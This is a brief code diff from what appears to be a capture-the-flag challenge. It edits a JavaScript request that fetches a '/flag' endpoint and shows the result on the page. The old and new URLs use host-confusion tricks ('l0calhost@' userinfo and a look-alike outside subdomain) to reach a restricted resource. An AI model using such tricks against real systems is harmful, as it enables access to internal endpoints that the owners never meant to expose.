@@ -12,7 +12,7 @@
     function get_page_info(){
         document.getElementById('test').innerHTML = "justfortest";
         var xhttp = new XMLHttpRequest();
-        xhttp.open("get", "http://l0calhost@blackhat4-a90cb6d84e9055435b7a5db40e24a343-0.chals.bh.ctf.sa/flag",true); 
+        xhttp.open("get", "https://l0calhost.hmb-baraka.com/flag",true); 
         xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             document.getElementById('respose').innerHTML = this.responseText;
